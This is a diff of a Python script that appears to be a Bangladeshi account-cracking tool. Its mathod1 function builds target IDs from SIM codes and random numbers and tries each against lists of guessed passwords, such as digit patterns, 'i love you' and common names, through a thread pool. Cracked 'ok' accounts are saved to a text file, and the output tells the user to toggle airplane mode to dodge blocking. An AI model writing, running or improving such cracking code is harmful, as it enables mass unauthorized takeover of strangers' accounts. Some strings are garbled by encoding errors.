@@ -270,19 +270,18 @@ def mathod1():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('\33[33;1m┏━[•] COUNTRY    : Bangladesh')
-		print('\33[33;1m┣━[•] TOTAL ID   :  '+tl)
-		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
-		print('\33[33;1m┗━[•] \033[1;92mSTART BD NAMBER MIXT CRACKING... ')
-		print(50*'━')
+		print(' TOTAL ACCOUNT :\033[1;92m '+tl)
+		print(f' \033[1;37mBD SIM CODE   :\033[1;92m {kode}\033[1;37m ')
+		print(' USE [\033[1;32mAIRPLANE\033[1;37m] MODE FOR Ok IDS')
+		# print(' â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya']
-			yaari.submit(b,uid,pwx,tl)
-	print(50*'_')
-	print(' [-] Crack process has been completed')
-	print(' [-] Ids saved in ok.txt,cp.txt')
-	print(50*'_')
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+kode+'bangladesh','i love you','@@@###']
+			yaari.submit(a,uid,pwx,tl)
+	print(47*'\033[1;31m\033[1;37m')
+	print(' [\033[1;32m!\033[1;37m] Cracking Complete')
+	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32mÃ¢Å¸Â©\033[1;37m] /sdcard/LIVE Ã¢â‚¬Â¢RANDOMÃ¢â‚¬Â¢OK.txt')
+	print(47*'\033[1;31m\033[1;37m')
 	exit()
 
 def mathod2():
